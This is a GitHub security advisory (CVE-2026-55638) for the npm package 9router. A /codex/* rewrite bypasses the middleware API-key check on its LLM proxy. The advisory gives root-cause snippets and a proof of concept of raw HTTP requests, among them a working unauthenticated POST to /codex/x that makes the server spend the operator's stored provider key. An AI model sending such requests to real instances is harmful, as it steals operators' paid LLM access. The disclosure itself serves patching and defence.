# [H] 9router: Unauthenticated LLM proxy access via /codex rewrite authorization bypass

## Summary
Severity: High
Advisory: GHSA-8gmq-j984-vp4r
CVE: CVE-2026-55638
CWE: CWE-862, CWE-863
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-8gmq-j984-vp4r
Type: github-advisory

## Affected
- npm: `9router` — affected >=0 <0.5.2

## Details
## Summary

9router exposes an OpenAI/Anthropic-compatible LLM proxy. Remote access to this proxy is intended to be protected by an API-key check in the Next.js middleware.

However, 9router also defines a rewrite that maps `/codex/*` to the backend LLM endpoint `/api/v1/responses`. The middleware authorization decision is made on the incoming request path before the rewrite is applied. Because `/codex` is not included in the middleware's protected LLM API prefix list, requests to `/codex/*` bypass the API-key gate and are later rewritten to the same backend used by `/api/v1/responses`.

As a result, an unauthenticated remote attacker can access the LLM proxy through `/codex/*` and cause the server to make upstream provider calls using the operator-stored LLM provider credentials.

## Details

| Component                     | File                                | Note                                                                      |
| ----------------------------- | ----------------------------------- | ------------------------------------------------------------------------- |
| Middleware authorization gate | `src/dashboardGuard.js`             | Protects `/v1`, `/v1beta`, `/api/v1`, and `/api/v1beta`, but not `/codex` |
| Rewrite configuration         | `next.config.mjs`                   | Rewrites `/codex/:path*` to `/api/v1/responses`                           |
| LLM backend route             | `src/app/api/v1/responses/route.js` | Dispatches rewritten requests to the LLM handler                          |
| Chat handler                  | `src/sse/handlers/chat.js`          | Uses operator-stored provider credentials for upstream calls              |

Tested version:

| Version / Commit                                             | Runtime          | Status   |
| ------------------------------------------------------------ | ---------------- | -------- |
| `v0.4.80`, commit `23da7b1fe3bb8edd2bdbdb63fbbb15a476b02c56` | Next.js `16.2.9` | Affected |

### Root Cause

The middleware classifies requests by the original incoming pathname. The protected public LLM API prefixes are:

```js
PUBLIC_PREFIXES = ["/v1", "/v1beta", "/api/v1", "/api/v1beta"];
```

Because `/codex` is not included in this list, a request such as `/codex/x` does not enter the LLM API authorization branch and falls through to:

```js
return NextResponse.next();
```

The rewrite configuration then maps the allowed request to the protected backend route:

```js
{
  source: "/codex/:path*",
  destination: "/api/v1/responses"
}
```

The backend route reaches the same handler used by the canonical LLM endpoint:

```js
return await handleChat(request);
```

The handler then processes the request and performs the upstream LLM provider call. In the tested configuration, the handler does not repeat the same middleware API-key gate for remote callers, so the rewritten request is served after bypassing the intended authorization check.

## PoC

The following requests use the same target server and the same remote-style `Host` header. The only meaningful difference is the request path.

### Case 01 — Protected canonical endpoint rejects unauthenticated access

```http
POST /api/v1/responses HTTP/1.1
Host: evil.attacker.com
Content-Type: application/json
Content-Length: 156

{"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
```

Observed result:

```http
HTTP/1.1 401 Unauthorized
```

This confirms that the canonical `/api/v1/responses` path is protected by the intended API-key gate.

### Case 02 — Rewritten `/codex/*` path bypasses the API-key gate

```http
POST /codex/x HTTP/1.1
Host: evil.attacker.com
Content-Type: application/json
Content-Length: 156

{"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
```

Observed result:

```http
HTTP/1.1 200 OK
```

The request reaches the LLM backend without an API key.

A controlled upstream provider endpoint recorded the outbound request from 9router:

```text
POST /responses
Authorization: Bearer NINEROUTER_OPERATOR_STORED_KEY_MARKER
request-body marker present: true
operator key marker in Authorization: true
```

This confirms that the unauthenticated `/codex/*` request causes 9router to make an upstream provider call using the operator-stored credentials.

### Case 03 — Unrelated unknown path does not reach the backend

```http
POST /notcodex/x HTTP/1.1
Host: evil.attacker.com
Content-Type: application/json
Content-Length: 156

{"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
```

Observed result:

```http
HTTP/1.1 404 Not Found
```

No upstream provider call is made. This isolates the issue to the `/codex/*` rewrite.

### Case 04 — Canonical endpoint succeeds only with a valid API key

```http
POST /api/v1/responses HTTP/1.1
Host: evil.attacker.com
Authorization: Bearer sk-REDACTED
Content-Type: application/json
Content-Length: 156

{"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
```

Observed result:

```http
HTTP/1.1 200 OK
```

This confirms that the canonical endpoint is functional and that the `401` response in Case 01 is an authorization failure, not a backend error.

## Attack Scenario

1. A remote attacker identifies a publicly reachable 9router instance.
2. The attacker sends LLM proxy requests to `/codex/*` instead of `/api/v1/responses`.
3. The middleware evaluates the original `/codex/*` path and does not apply the LLM API-key gate.
4. The rewrite maps the request to `/api/v1/responses`.
5. The backend processes the request and performs an upstream provider call.
6. The upstream call uses the operator-stored provider credentials.

## Impact

A successful attacker can use the operator's configured LLM provider account without authentication.

Likely consequences include:

* Unauthorized use of the 9router LLM proxy.
* Consumption of the operator's provider credits or quota.
* Unexpected billing impact.
* Abuse of configured OpenAI/Anthropic-compatible providers.
* Exposure of model/provider behavior through proxy responses.
* Bypass of the intended API-key access control for remote LLM proxy access.

## References
- https://github.com/decolua/9router/security/advisories/GHSA-8gmq-j984-vp4r
- https://nvd.nist.gov/vuln/detail/CVE-2026-55638
- https://github.com/decolua/9router/commit/b282f0554972ea35281520738759d76abcd0b0b3
- https://github.com/decolua/9router
- https://github.com/decolua/9router/releases/tag/v0.5.2
